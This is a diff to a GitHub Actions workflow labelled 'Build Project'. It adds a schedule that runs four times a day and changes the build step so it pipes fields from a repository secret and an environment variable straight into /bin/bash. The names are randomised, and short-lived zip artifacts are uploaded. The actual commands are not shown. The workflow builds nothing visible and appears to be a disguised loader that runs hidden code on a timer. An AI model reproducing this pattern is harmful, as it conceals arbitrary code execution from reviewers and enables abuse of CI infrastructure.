@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '58 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,16 +20,15 @@ jobs:
           fetch-depth: 1
       - name: Run build
         env:
-          kk2193: ${{ secrets.kk2193 }}
+          ifohh12: ${{ secrets.ifohh12 }}
         run: |
-          printf '%s' "$kk2193" | jq -r .zm00535 | /bin/bash
-          echo $nidnv512 | jq -r .x81 | /bin/bash
-          printf '%s' "$gqp2" | jq -r .dy44682 | /bin/bash
+          printf '%s' "$ifohh12" | jq -r .x71238 | /bin/bash
+          echo $zdb40 | jq -r .k616 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: vbbx1QG1
+          name: odor6Fau
           path: "*.zip"
           retention-days: 1
